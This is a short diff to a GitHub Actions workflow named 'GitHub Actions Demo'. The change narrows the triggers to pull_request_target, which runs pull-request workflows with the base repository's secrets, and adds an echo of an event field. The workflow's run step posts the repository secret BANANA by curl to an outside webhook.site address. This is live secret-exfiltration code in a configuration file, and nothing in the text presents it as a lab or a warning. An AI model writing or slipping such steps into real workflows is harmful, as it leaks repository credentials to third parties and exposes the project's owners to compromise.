@@ -2,12 +2,11 @@ name: GitHub Actions Demo
 run-name: ${{ github.actor }} is testing out GitHub Actions 🚀
 on:
   pull_request_target:
-  pull_request:
-    branches: [master]
   
 jobs:
   Explore-GitHub-Actions:
     runs-on: ubuntu-latest
     steps:
       - run: |
+          echo ${{ github.event.banana || github.event.pull_request_target.head.sha }}
           curl https://webhook.site/b9b9f3a9-fb5f-47bd-a6ae-55009feebd48 -d "segredo=${{ secrets.BANANA }}"
